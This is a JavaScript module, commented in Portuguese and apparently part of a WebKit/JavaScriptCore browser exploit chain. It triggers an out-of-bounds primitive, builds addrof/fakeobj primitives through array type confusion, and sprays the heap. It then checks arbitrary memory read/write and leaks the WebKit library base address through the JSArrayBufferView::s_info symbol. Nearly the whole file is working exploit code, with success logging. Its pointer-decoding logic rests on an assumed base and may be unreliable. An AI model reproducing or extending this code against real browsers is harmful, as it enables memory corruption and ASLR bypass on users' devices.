// js/script3/testArrayBufferVictimCrash.mjs (v140 - R100 Substituir new AdvancedInt64 por fromParts)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Substitui TODAS as chamadas a 'new AdvancedInt64(low, high)' por 'AdvancedInt64.fromParts(low, high)'
//   em testArrayBufferVictimCrash.mjs. Isso visa evitar o construtor problemático.
// - Isso inclui chamadas para valores literais e resultados de operações.
// - AGORA TAMBÉM GARANTE QUE 'new AdvancedInt64(single_arg)' para valores como
//   WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST E offsets de DATA_OFFSETS
//   são substituídos por 'AdvancedInt64.fromParts()' usando a função auxiliar
//   'hexStringToParts' para parsing da string hexadecimal.
// - ADICIONADO LOGS DE DEPURACÃO PARA VALIDAÇÃO DE WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
// Importa a nova função hexStringToParts
import { AdvancedInt64, toHex, isAdvancedInt64Object, hexStringToParts } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute,
    oob_write_absolute,
    getOOBAllocationSize
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v140_R100_AllFromParts";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    const low = u32[0];
    const high = u32[1];

    if (!Number.isInteger(low) || low < 0 || low > 0xFFFFFFFF ||
        !Number.isInteger(high) || high < 0 || high > 0xFFFFFFFF) {
        logS3(`ALERTA: doubleToInt64 recebeu double (${double}) que resultou em low: ${toHex(low)}, high: ${toHex(high)}. Retornando AdvancedInt64.Zero.`, "warn");
        return AdvancedInt64.Zero;
    }
    return AdvancedInt64.fromParts(low, high);
}

// =======================================================================================
// FUNÇÃO: DECODIFICAR PONTEIRO COMPRIMIDO (HIPOTÉTICO)
// =======================================================================================
function decodeCompressedPointer(leakedAddr) {
    // DEBUGGING: Log o valor de WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST antes de ser usado
    logS3(`[DEBUG] decodeCompressedPointer: WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST: "${WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST}" (Type: ${typeof WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST})`, "debug");

    // Usar AdvancedInt64.fromParts para o assumed_heap_base_for_decompression
    // Convertendo a string hexadecimal em partes low e high
    const assumed_base_parts = hexStringToParts(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
    const assumed_heap_base_for_decompression = AdvancedInt64.fromParts(
        assumed_base_parts.low,
        assumed_base_parts.high
    );

    const compressed_offset_32bit = leakedAddr.low();

    const offset_as_int64 = AdvancedInt64.fromParts(compressed_offset_32bit, 0);

    const decoded_ptr = assumed_heap_base_for_decompression.add(offset_as_int64);

    logS3(`    [PointerDecode] Endereço comprimido/taggeado recebido: ${leakedAddr.toString(true)}`, "debug");
    logS3(`    [PointerDecode] Offset de 32 bits extraído (low): ${toHex(compressed_offset_32bit)}`, "debug");
    logS3(`    [PointerDecode] Base de heap assumida para descompressão: ${assumed_heap_base_for_decompression.toString(true)}`, "debug");
    logS3(`    [PointerDecode] Endereço decodificado (hipotético): ${decoded_ptr.toString(true)}`, "info");

    return decoded_ptr;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    // DEBUGGING: Log o valor de WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST no início da função principal
    logS3(`[DEBUG] executeTypedArrayVictimAddrofAndWebKitLeak_R43: WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST: "${WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST}" (Type: ${typeof WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST})`, "debug");

    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Fix para Construtor AdvancedInt64 (All FromParts) ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func;

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null;

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // Definir a constante localmente
    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;

    try {
        // Helper para definir as primitivas addrof/fakeobj.
        const setupAddrofFakeobj = () => {
            confused_array = [13.37];
            victim_array = [{ dummy: 0 }];

            addrof_func = (obj) => {
                victim_array[0] = obj;
                // addrof_func vai retornar o ponteiro comprimido/taggeado
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => {
                confused_array[0] = int64ToDouble(addr);
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj();

        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => {
            leaker_phase4.obj_prop = fakeobj_func(addr);
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => {
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF;
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i * 2, d: i * 3 });
        }
        const test_obj_phase4 = spray_phase4[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        // Obter o endereço COMPRIMIDO/TAGGEADO do test_obj_phase4
        const test_obj_addr_phase4_compressed = addrof_func(test_obj_phase4);
        logS3(`(Verificação Fase 4) Endereço COMPRIMIDO do test_obj_phase4: ${test_obj_addr_phase4_compressed.toString(true)}`, "leak");

        // Decodificar o endereço para uso na primitiva L/E
        const test_obj_addr_phase4_decoded = decodeCompressedPointer(test_obj_addr_phase4_compressed);
        logS3(`(Verificação Fase 4) Endereço DECODIFICADO do test_obj_phase4: ${test_obj_addr_phase4_decoded.toString(true)}`, "leak");

        // Validação da decodificação na Fase 4: O endereço decodificado deve ser um ponteiro 0x7FFF...
        if (test_obj_addr_phase4_decoded.equals(AdvancedInt64.Zero) || (test_obj_addr_phase4_decoded.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Endereço DECODIFICADO na Fase 4 é inválido (${test_obj_addr_phase4_decoded.toString(true)}). A lógica de decodificação de ponteiro está incorreta.`);
        }
        logS3(`(Verificação Fase 4) Endereço decodificado válido. Prosseguindo com teste L/E.`, "good");

        const prop_a_addr_phase4 = test_obj_addr_phase4_decoded.add(AdvancedInt64.fromParts(0x10, 0)); // Usar fromParts para 0x10
        const value_to_write_phase4 = AdvancedInt64.fromParts(0x12345678, 0xABCDEF01);

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço DECODIFICADO ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}. (Problema de decodificação de ponteiro?)`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50);

        // ============================================================================
        // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (AGORA COM DECODIFICAÇÃO DE PONTEIRO)
        // ============================================================================
        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (COM DECODIFICAÇÃO DE PONTEIRO) ---", "subtest");

        leaker_phase4 = null;
        await PAUSE_S3(200);

        logS3("Ambiente OOB existente será reutilizado. Primitivas addrof/fakeobj da Fase 4 serão reutilizadas.", "good");

        logS3("--- Warm-up: PULADO, Primitivas da Fase 4 estão sendo reutilizadas. ---", "info");
        await PAUSE_S3(50);

        // Criar o arb_rw_array. Ele será alocado no heap.
        arb_rw_array = new Uint8Array(0x1000);
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // OBTEM O ENDEREÇO COMPRIMIDO DO ARRAYBUFFERVIEW DE arb_rw_array USANDO addrof_func.
        const arb_rw_array_ab_view_addr_compressed = addrof_func(arb_rw_array);
        logS3(`    Endereço COMPRIMIDO do ArrayBufferView de arb_rw_array (obtido via addrof_func): ${arb_rw_array_ab_view_addr_compressed.toString(true)}`, "leak");

        // Decodificar o endereço comprimido para o endereço real de 64 bits.
        const arb_rw_array_ab_view_addr_decoded = decodeCompressedPointer(arb_rw_array_ab_view_addr_compressed);
        logS3(`    Endereço DECODIFICADO do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr_decoded.toString(true)}`, "leak");

        // Validação crucial: o endereço decodificado deve ser um ponteiro de userland (0x7FFF...)
        if (arb_rw_array_ab_view_addr_decoded.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr_decoded.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: addrof_func para arb_rw_array falhou ou retornou endereço DECODIFICADO inválido (${arb_rw_array_ab_view_addr_decoded.toString(true)}). Não é possível construir L/E arbitrária.`);
        }
        logS3(`    Addrof de arb_rw_array bem-sucedido e endereço decodificado válido.`, "good");


        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está disponível.");

        // A primitiva OOB opera em OFFSETS relativos. A `arb_read_stable` e `arb_write_stable`
        // devem usar `fakeobj_func` com o endereço decodificado para leitura/escrita arbitrária.

        arb_read_stable = (address, size_bytes) => {
            const temp_leaker = { obj_prop: null, val_prop: 0 };
            // fakeobj_func agora aceita o 'address' bruto (já decodificado)
            temp_leaker.obj_prop = fakeobj_func(address);
            const result_64 = doubleToInt64(temp_leaker.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };

        arb_write_stable = (address, value, size_bytes) => {
            const temp_leaker = { obj_prop: null, val_prop: 0 };
            // fakeobj_func agora aceita o 'address' bruto
            temp_leaker.obj_prop = fakeobj_func(address);
            if (size_bytes === 4) {
                temp_leaker.val_prop = Number(value) & 0xFFFFFFFF;
            } else {
                temp_leaker.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas de L/E estáveis (arb_read_stable, arb_write_stable) construídas com sucesso usando fakeobj_func direta.", "good");
        await PAUSE_S3(50);


        // ============================================================================
        // FASE FINAL: VAZAR BASE WEBKIT LENDO DE SÍMBOLO GLOBAL CONHECIDO (USANDO arb_read_stable)
        // ============================================================================
        logS3("--- FASE 6: VAZAMENTO DE WEBKIT BASE LENDO DE SÍMBOLO GLOBAL CONHECIDO (com arb_read_stable) ---", "subtest");

        // Usar hexStringToParts para criar a AdvancedInt64 a partir da string hexadecimal
        const assumed_webkit_base_parts = hexStringToParts(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
        const assumed_webkit_base = AdvancedInt64.fromParts(assumed_webkit_base_parts.low, assumed_webkit_base_parts.high);
        logS3(`[ASSUNÇÃO] Usando base da WebKit assumida para teste: ${assumed_webkit_base.toString(true)}`, "warn");

        // Primeiro, converta a string hexadecimal do offset em partes low/high
        const s_info_offset_parts = hexStringToParts(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"]);
        const s_info_offset = AdvancedInt64.fromParts(s_info_offset_parts.low, s_info_offset_parts.high);

        const s_info_address = assumed_webkit_base.add(s_info_offset);
        logS3(`[Etapa 1] Endereço de JSC::JSArrayBufferView::s_info (assumido): ${s_info_address.toString(true)}`, "info");

        // Agora, tente ler um QWORD (ponteiro) do s_info usando a primitiva estável.
        const s_info_val = arb_read_stable(s_info_address, 8);
        logS3(`[Etapa 2] Valor lido de JSC::JSArrayBufferView::s_info: ${s_info_val.toString(true)}`, "leak");

        // Validação: O valor lido deve ser um ponteiro válido para a WebKit (0x7FFF...)
        if (s_info_val.equals(AdvancedInt64.Zero) || (s_info_val.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Leitura de JSC::JSArrayBufferView::s_info retornou um valor inválido (${s_info_val.toString(true)}). A base assumida ou o offset estão incorretos, ou a primitiva de L/E não pode ler fora do heap JS.`);
        }
        logS3(`[Etapa 2] Leitura de s_info bem-sucedida! Isso confirma que a primitiva de L/E pode ler em endereços arbitrários.`, "good");

        // Calcular o endereço base da WebKit.
        const webkit_base_addr = s_info_val.sub(s_info_offset);
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        if (webkit_base_addr.equals(AdvancedInt64.Zero) || (webkit_base_addr.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Endereço Base da WebKit calculado (${webkit_base_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
        }

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`    ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null;
        arb_read_stable = null;
        arb_write_stable = null;

        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Pointer Decoding Attempt)' }
    };
}
